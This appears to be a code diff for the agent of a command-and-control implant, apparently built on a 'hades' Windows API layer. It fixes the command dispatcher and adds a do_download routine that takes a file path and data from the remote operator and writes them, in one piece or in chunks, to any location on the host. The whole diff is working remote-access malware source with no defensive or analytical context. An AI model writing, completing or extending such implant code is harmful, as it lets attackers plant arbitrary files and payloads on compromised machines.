@@ -66,7 +66,7 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 			do_upload();
 			break;
 		case CMD_CODE_DOWNLOAD:
-			do_upload();
+			do_download();
 			break;
 		default:
 			break;
@@ -79,6 +79,55 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 
 
 void commanders::do_download() {
+	printf("Hit Do_download()\n");
+	HANDLE hFie = NULL;
+	PCHAR Path = NULL;
+	PBYTE Buf = NULL;
+
+	UINT DataSize = 0;
+	UINT PathLen = 0;
+
+	UINT taskID = g_ByteMgr->BeginTask();
+	UINT type = g_ByteMgr->Read4();
+	printf("type: %d\n", type);
+
+	if (type == UPLOAD_START_NON_CHUNKED || type == UPLOAD_START_CHUNKED) {
+		printf("hit upload_*\n");
+		PathLen = g_ByteMgr->Read4();
+		printf("PathLen: %d\n", PathLen);
+		Path = g_ByteMgr->ReadString(PathLen);
+		printf("Path: %s\n", Path);
+		hFie = hades->WinApis.CreateFileA(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFie == INVALID_HANDLE_VALUE) {
+			g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+			goto CLEANUP;
+		}
+	}
+	else {
+		hFie = g_FileMgr->GetHandle(taskID);
+	}
+	DataSize = g_ByteMgr->Read4();
+	Buf = (PBYTE)g_ByteMgr->ReadString(DataSize);
+	if (!hades->WinApis.WriteFile(hFie, Buf, DataSize, NULL, NULL)) {
+		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+		goto CLEANUP;
+	}
+
+
+	if (type == UPLOAD_START_CHUNKED) {
+		g_FileMgr->InsertTask(taskID, hFie, FileUpload);
+	}
+	else if (type == TS_UPLOAD_DONE || type == UPLOAD_START_NON_CHUNKED) {
+		hades->WinApis.CloseHandle(hFie);
+		g_ByteMgr->EndOk(DOWNLOAD_SUCCESS);
+		if (type == TS_UPLOAD_DONE) { g_FileMgr->RemoveTask(taskID); }
+
+	}
+
+
+CLEANUP:
+	if (Path) { HeapFree(GetProcessHeap(), 0, Path); }
+	if (Buf) { HeapFree(GetProcessHeap(), 0, Buf); }
 	return;
 }
 
@@ -131,7 +180,7 @@ void commanders::do_upload() {
 		g_ByteMgr->Write4(BytesRead);
 		g_ByteMgr->WriteString(buf, BytesRead);
 
-		if (!g_FileMgr->InsertTask(TaskID, hFile)) {
+		if (!g_FileMgr->InsertTask(TaskID, hFile, FileDownload)) {
 			g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
 			goto CLEANUP;
 		}
